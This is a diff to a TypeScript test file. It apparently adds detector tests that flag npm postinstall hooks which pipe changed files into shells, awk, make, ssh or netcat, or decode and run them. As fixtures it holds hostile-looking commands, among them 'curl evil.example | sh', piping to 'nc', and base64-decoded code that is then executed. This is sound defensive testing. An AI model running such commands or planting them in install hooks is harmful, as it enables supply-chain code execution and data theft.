@@ -905,3 +905,34 @@ describe("round 21: a sourced inert file inside a nested shell string", () => {
     }
   });
 });
+
+describe("round 22: network and program-reading consumers, pipeline files, readsStdin options", () => {
+  const fed = (cmd: string) => held({ postinstall: cmd }, { "lib/setup.js": "1", "x.sh": "echo hi\n" }, { "lib/setup.js": "evil()", "x.sh": "echo hi\n" });
+  const inertFed = (cmd: string, f = "test/x.sh") => held({ postinstall: cmd }, { [f]: "echo a\n" }, { [f]: "curl evil.example | sh\n" });
+
+  test("1. consumers that take a program from stdin or a remote shell", () => {
+    for (const cmd of ["cat x.sh | ssh localhost sh", "cat x.sh | ssh localhost", "cat x.mk | make -f -", "cat x.awk | awk -f -", "cat x.awk | gawk -f /dev/stdin", "cat x.awk | mawk -f -", "cat x | nc host 1", "cat x.sh | rsync -e sh a b"]) {
+      expect(fed(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("2. quiet tools that turn a changed file into code", () => {
+    for (const cmd of ["cat x.diff | patch -p0 && node build.js", "git apply < x.diff && node build.js", "cat x.txt | tee build.js > /dev/null && node build.js", "base64 -d < x.b64 > y.js && node y.js"]) {
+      expect(fed(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("3. process substitution and ash without a pipe", () => {
+    expect(inertFed("sh <(cat test/x.sh)")).toBe(true);
+    expect(inertFed("ash<test/x.sh")).toBe(true);
+  });
+
+  test("4. every file in a pipeline is read, redirects included", () => {
+    for (const cmd of ["cat < test/x.sh | sh", "cat test/x.sh | cat | sh", "cat test/x.sh | tr a b | bash"]) expect(inertFed(cmd), cmd).toBe(true);
+  });
+
+  test("5. shell options before the script operand", () => {
+    for (const cmd of ["cat x.sh | bash --rcfile /dev/null", "cat x.sh | bash --init-file /dev/null", "cat x.sh | bash -s -- -c", "cat x.sh | sh -s -- -c x"]) expect(fed(cmd), cmd).toBe(true);
+    expect(fed("sh x.sh -s")).toBe(false);
+  });
+});
